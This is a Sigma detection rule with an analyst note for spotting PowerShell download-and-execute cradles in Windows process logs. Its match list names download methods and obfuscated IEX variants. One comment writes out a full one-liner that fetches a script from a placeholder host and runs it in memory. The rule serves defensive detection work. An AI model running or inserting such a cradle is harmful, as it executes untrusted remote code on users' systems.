title: PowerShell Download and Execution Cradles
id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
status: test
description: Detects PowerShell download and execution cradles.
references:
- https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd
- https://labs.withsecure.com/publications/fin7-target-veeam-servers
author: Florian Roth (Nextron Systems)
date: 2022-03-24
modified: 2025-07-18
tags:
- attack.execution
- attack.t1059
logsource:
  product: windows
  category: process_creation
detection:
  selection_download:
    CommandLine|contains:
    - '.DownloadString('
    - '.DownloadFile('
    - 'Invoke-WebRequest '
    - 'iwr '
    - 'Invoke-RestMethod '
    - 'irm '          # powershell -ep bypass -w h -c irm test.domain/ffe | iex
  selection_iex:
    CommandLine|contains:
    - ';iex $'
    - '| IEX'
    - '|IEX '
    - 'I`E`X'
    - 'I`EX'
    - 'IE`X'
    - 'iex '
    - 'IEX ('
    - 'IEX('
    - 'Invoke-Expression'
  condition: all of selection_*
falsepositives:
- Some PowerShell installers were seen using similar combinations. Apply filters accordingly
level: high
note: |
  ### Technical Context
  This detection rule identifies suspicious PowerShell commands that are commonly associated with the use of download and execution cradles. These techniques involve leveraging PowerShell to download malicious scripts or payloads from remote locations and executing them directly in memory, which can facilitate various types of attacks, including data exfiltration and remote code execution. In the context of an adversary, such as a threat actor from the FIN7 group, the objective typically revolves around stealthily delivering malware while evading detection mechanisms.

  The relevant MITRE ATT&CK tactics and techniques for this behavior include:
  - **Execution** (TA0002)
    - **Command-Line Interface** (T1059)

  Data sources that will provide the most pertinent evidence for detecting this activity include logs related to process creation events on Windows systems. These logs can capture the command line arguments of PowerShell executions, allowing analysts to identify potentially malicious commands.

  ### Investigation Steps
  - **Review Process Logs**: Analyze Windows process creation logs for entries that contain PowerShell commands, particularly those involving `.DownloadString`, `.DownloadFile`, `Invoke-WebRequest`, and `Invoke-RestMethod`. Focus on the command line parameters to identify any suspicious activity.
  - **Correlate with Anomalous Behavior**: Investigate the source and destination of any URLs invoked through PowerShell. Look for connections to known malicious domains or IP addresses that may indicate command and control (C2) interactions.
  - **Check for Preceding Context**: Identify any unusual patterns leading up to the PowerShell execution, including prior process behavior or user activity that may signify exploitation or an unauthorized privilege escalation attempt.
  - **Validate User Context**: Determine the user context under which the PowerShell commands were executed. Examine whether the commands were executed by a legitimate user or an account that has been compromised or is exhibiting unusual behavior.

  ### Prioritization
  Given the nature of the detected behavior, this alert should be treated with high priority. The potential for executing arbitrary code and delivering malware poses significant risks to enterprise environments, making it critical to respond swiftly to mitigate impact.

  ### Blind Spots and Assumptions
  The detection logic may not cover instances where PowerShell is executed using obfuscated commands, alternative methods for retrieval (e.g., Windows Management Instrumentation), or non-PowerShell executable download methods. Additionally, false positives may arise from legitimate use cases, such as administrative tasks that incorporate similar command syntax. Effective logging configurations, including comprehensive PowerShell logging and command line arguments, are essential for the rule to function correctly and provide accurate alerts.

